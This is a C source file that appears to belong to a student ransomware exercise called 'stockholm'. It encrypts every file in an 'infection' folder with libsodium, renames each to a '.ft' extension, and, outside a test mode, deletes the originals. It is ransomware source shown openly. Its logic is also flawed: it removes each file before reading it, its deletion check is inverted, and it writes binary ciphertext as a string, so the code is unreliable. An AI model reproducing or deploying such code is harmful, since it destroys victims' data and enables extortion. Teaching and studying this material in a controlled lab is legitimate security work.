#include "stockholm.h"

/*		Proto : utils func		*/
char	*addcrypt(char *file);
char	*chgext(char *filename);

void	encrypt(struct linkedFile *list, struct cryptFile data)
{
	char	cwd[1024];
	if (TEST)
		system("mkdir crypted 2> /dev/null");
	while (list)
	{
		getcwd(cwd, sizeof(cwd));
		if (chdir("infection") != 0 && strcmp("/infection", cwd + strlen(cwd) - 10))
			(perror("Can't find the infection file !\n"), exit(1));
		
		FILE *fp;
		if (TEST)
			fp = fopen(addcrypt(chgext(list->file)), "wb");
		else
			fp = fopen(chgext(list->file), "wb");
		
		if (TEST == 0)
		{
			if (remove(list->file) == 0)
				fprintf(stderr, "%s can't delete file", list->file);
		}

		int	flen = filelen(list->file);
		char	*buffer = malloc(flen + 1);
		if (!buffer)
		{
			perror("Allocation memory failed :<");
			exit(0);
		}

		FILE *file = fopen(list->file, "rb");
		if (file == NULL)
		{
			fprintf(stderr, "%s can't be open !\n", list->file);
			exit(1);
		}
		fread(buffer, sizeof(char), flen, file);
		buffer[flen] = 0;
		fclose(file);

		unsigned char cypher[flen + crypto_secretbox_MACBYTES];

		if (crypto_secretbox_easy(cypher, (const unsigned char *)buffer, flen, data.nonce, data.key) != 0) {
			fprintf(stderr, "%s file : Encryption failed\n", list->file);
		}
		if (silent == 0)
			printf("\033[1;35mFile %s is now encrypted !\033[0m\n", list->file);
		fprintf(fp, "%s\n", cypher);
		fclose(fp);
		free(buffer);
		list = list->next;
	}
	if (silent == 0)
		printf("%s\n", ENCRYPTION_SUCCESS);
}

/*
*	Utils function
*/

char	*addcrypt(char *file)
{
	char	*crypt = malloc(strlen(file) + 1 + strlen("../crypted/"));
	if (!crypt)
		exit(1);
	int		i = -1;

	crypt[0] = '.';
	crypt[1] = '.';
	crypt[2] = '/';
	crypt[3] = 'c';
	crypt[4] = 'r';
	crypt[5] = 'y';
	crypt[6] = 'p';
	crypt[7] = 't';
	crypt[8] = 'e';
	crypt[9] = 'd';
	crypt[10] = '/';
	while (file[++i])
		crypt[i + 11] = file[i];
	free(file);
	crypt[i + 11] = 0;
	return (crypt);
}

int	filelen(char *filename)
{
	FILE *fp = fopen(filename, "r");

	if (fp == NULL)
	{
		printf("Error: fopen() failed\n");
		exit(1);
	}
	fseek(fp, 0, SEEK_END);
	int		flen = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	fclose(fp);
	return (flen);
}

char	*chgext(char *filename)
{
	int	i;
	int	eof = 1; // "\0"
	int	ftext = 3; // ".ft"

	i = 0;
	while (filename[i] && filename[i] != '.')
		i++;
	char	*ft = malloc((i + ftext + eof) * sizeof(char));
	if (!ft)
		return (NULL);
	i = -1;
	while (filename[++i] && filename[i] != '.')
		ft[i] = filename[i];
	ft[i++] = '.';
	ft[i++] = 'f';
	ft[i++] = 't';
	ft[i] = 0;
	return (ft);
}